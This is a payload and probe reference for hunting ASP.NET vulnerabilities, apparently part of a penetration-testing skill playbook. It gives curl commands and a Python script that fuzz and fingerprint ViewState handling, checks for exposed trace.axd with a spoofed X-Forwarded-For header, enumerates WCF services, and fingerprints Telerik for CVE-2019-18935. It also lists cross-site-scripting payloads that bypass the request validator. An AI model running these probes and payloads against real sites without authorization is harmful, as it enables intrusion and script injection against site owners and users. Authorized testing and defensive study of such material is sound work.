# Payloads — ASP.NET-specific vulnerability hunting

Payload lists and probe banks. Methodology and usage are in the parent SKILL.md.

## Payload references from upstream skills (deduplicated)

### hunting / references/payloads.md

# aspnet — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payload & Detection Patterns



**Stack-trace fingerprint (trigger via stale ViewState POST):**

```bash

curl -sk -X POST "https://target.example/page.aspx" \

  --data "__VIEWSTATE=AAAA&__VIEWSTATEGENERATOR=AAAA"

# Inspect body for:

#  - "Validation of viewstate MAC failed" → confirms signed ViewState

#  - "The state information is invalid for this page" → confirms ALTERNATE parser path

#  - "Version Information: Microsoft .NET Framework Version:X.X.XXXXX" → exact patch level

#  - "Microsoft.SharePoint.Client.ServerStub..." → SharePoint farm

```



**ViewState parser-error differential probe (Python):**

```python

import requests, re, json

S = requests.Session(); S.verify = False

# Get fresh form

r = S.get("https://target.example/path/page.aspx")

real_vs = re.search(r'__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)', r.text).group(1)

real_vsg = re.search(r'__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)', r.text).group(1)



# Test 7 payload shapes

for label, vs in [

    ("trivial",      "AAAA"),

    ("real",         real_vs),

    ("flipped-bit",  real_vs[:50] + "X" + real_vs[51:]),

    ("oversize",     "A" * 100000),

    ("base64",       "VGVzdE1hcmtlcjY3OFhZWg=="),

    ("xml-shaped",   "<xss/>"),

    ("losformatter", "/wEPDwUKMTcxNzgyOTQwMmRkkz9p4lzA" + "A"*50),

]:

    r = S.post("https://target.example/path/page.aspx",

               data={"__VIEWSTATE": vs, "__VIEWSTATEGENERATOR": real_vsg})

    title = re.search(r'<title>([^<]+)</title>', r.text)

    title = title.group(1)[:100] if title else "—"

    print(f"  [{label:14s}] {r.status_code}  {title}")

```



**`trace.axd` anonymous check:**

```bash

curl -sk -o /dev/null -w "%{http_code}\n" "https://target.example/trace.axd"

# 200 = full trace dump exposed → Critical

# 403 = mod set to localhost-only → check via X-Forwarded-For: 127.0.0.1

```



**WCF service enumeration:**

```bash

# Find all .svc files

curl -sk "https://target.example/" -o body.html

grep -oE '/[a-zA-Z0-9/_-]+\.svc' body.html | sort -u

# For each found:

curl -sk "https://target.example/Service.svc?wsdl" | xmllint --format - | head -60

```



**Request-validator bypass categories:**

```

# Default: <script>alert(1)</script> in ?q= → "Potentially dangerous Request.QueryString value detected"

# Bypasses that sometimes work:

?q=%3cscript%3e            (URL-encoded — depends on validator config)

?q=<svg/onload=alert(1)>  (depends on validator version)

?q=<%00script>             (NUL-byte; older validators)

?q=javascript:alert(1)     (no < at all — passes validator)

Cookie: foo=<script>       (cookie body not validated by default)

Referer: http://x.com/<script>  (referer not validated in classic ASP.NET)

```



**Telerik exploit gate (CVE-2019-18935 — requires encryption keys):**

```bash

# Fingerprint Telerik

curl -sk "https://target.example/Telerik.Web.UI.WebResource.axd?type=rau" -X POST

# If response is RadAsyncUploadHandler-style → Telerik present; try keys

# Public exploits require leaked machineKey AND telerikEncryptionKey

```



---
